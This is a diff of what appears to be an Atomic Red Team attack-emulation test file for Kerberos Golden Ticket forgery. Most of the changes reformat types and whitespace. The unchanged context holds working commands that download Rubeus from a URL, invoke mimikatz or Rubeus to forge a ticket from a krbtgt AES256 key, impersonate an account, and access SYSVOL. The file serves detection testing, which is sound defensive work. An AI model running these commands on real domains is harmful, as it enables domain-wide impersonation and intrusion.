@@ -8,27 +8,27 @@ atomic_tests:
     This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
     The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     domain_sid:
       description: SID of the targeted domain, if you keep default it will automatically get the current domain SID
-      type: String
+      type: string
       default: S-1-5-21-DEFAULT
     domain:
       description: Targeted Active Directory domain FQDN
-      type: String
+      type: string
       default: '%userdnsdomain%'
     account:
       description: Account to impersonate
-      type: String
+      type: string
       default: goldenticketfakeuser
     krbtgt_aes256_key:
       description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)
-      type: String
+      type: string
       default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
     mimikatz_path:
       description: Mimikatz windows executable
-      type: Path
+      type: path
       default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
   dependency_executor_name: powershell
   dependencies:
@@ -82,10 +82,10 @@ atomic_tests:
         echo End of Golden Ticket attack
       )
       "@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat
-      
+
       # run batch file in a new empty session (password and username do not matter)
       echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null
-      
+
       # wait until the output file has logged the entire attack
       do {
         Start-Sleep 1 # wait a bit so the output file has time to be created
@@ -108,31 +108,31 @@ atomic_tests:
     This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
     The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     domaincontroller:
       description: Targeted Active Directory domain FQDN
-      type: String
-      default:  $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"
+      type: string
+      default: $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"
     account:
       description: Account to impersonate
-      type: String
+      type: string
       default: $ENV:username
     krbtgt_aes256_key:
       description: Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)
-      type: String
+      type: string
       default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
     local_folder:
       description: Local path of Rubeus executable
-      type: Path
+      type: path
       default: $Env:temp
     local_executable:
       description: name of the rubeus executable
-      type: String
+      type: string
       default: 'rubeus.exe'
     rubeus_url:
       description: URL of Rubeus executable
-      type: Url
+      type: url
       default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
   dependency_executor_name: powershell
   dependencies:
@@ -151,13 +151,13 @@ atomic_tests:
   executor:
     name: powershell
     elevation_required: false
-    command: |   
+    command: |
       Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
       Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
-      
+
       cmd.exe /c "#{local_folder}\#{local_executable}" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden
       $filename = (Get-ChildItem | ? {$_.Name.startswith("golden_")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name
-      
+
       # create batch file with commands to run in a separate "runas /netonly" session
       # so we don't purge Kerberos ticket from the current Windows session
       # its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise
@@ -180,10 +180,10 @@ atomic_tests:
         echo End of Golden Ticket attack
       )
       "@ -Replace "kirbifile", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat
-      
+
       # run batch file in a new empty session (password and username do not matter)
       echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null
-      
+
       # wait until the output file has logged the entire attack
       do {
         Start-Sleep 1 # wait a bit so the output file has time to be created
